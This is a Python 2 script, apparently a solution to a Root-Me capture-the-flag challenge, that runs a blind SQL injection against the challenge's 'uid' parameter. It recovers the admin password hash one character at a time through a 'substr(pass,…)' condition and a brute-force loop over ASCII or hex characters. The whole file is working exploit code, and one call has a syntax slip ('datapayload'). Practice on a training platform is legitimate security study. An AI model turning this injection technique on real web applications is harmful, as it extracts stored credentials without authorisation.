import requests
import re

cookies=dict(spip_session='XX', PHPSESSID='XX')
#auth=HTTPBasicAuth('user', 'pass'))
auth=""
found=0
length=1
longueur=40
#Debut du code ascii a tester : 48 a 126 pour la table ascii basique / 48 a 57 puis 97 a 102 pour MD5
current_car=48
ascii_end=126
final_pass=""
#Le mot de passe est-il en md5 ?
md5=1
print "[>>] Brute-force in progress..."

if (md5==1):
	print "[>>] Using MD5 mode..."
	longueur=32
	ascii_end=103
	
while(found==0 and current_car<ascii_end):
	if (md5==1 and current_car==58):
		current_car=current_car+39
	if (current_car==95):
		current_car+=1
	url="http://challenge01.root-me.org//realiste/ch8/?id=6&action=view&uid=1 and login=\"admin\" and substr(pass,"+str(length)+",1"+")=\""+str(chr(current_car))+"\""
	#result=requests.get(url, cookies=cookies, headers={"Accept-Language":"en"}, auth=auth).content
	payload = {'login': 'tutu', 'password': 'tata'}
	result=requests.post(url, cookies=cookies, headers={"Accept-Language":"en"}, auth=auth, datapayload).content
	res=re.search("no such user", result)
	if res is None:
		if (length!=longueur):
			print "["+str(length)+"/"+str(longueur)+"] " + final_pass
			final_pass+=chr(current_car)
			length+=1
			current_car=48
		else:
			final_pass+=chr(current_car)
			found=1

	else:
		current_car+=1

print ("[\o/] Flag : %s " % final_pass)
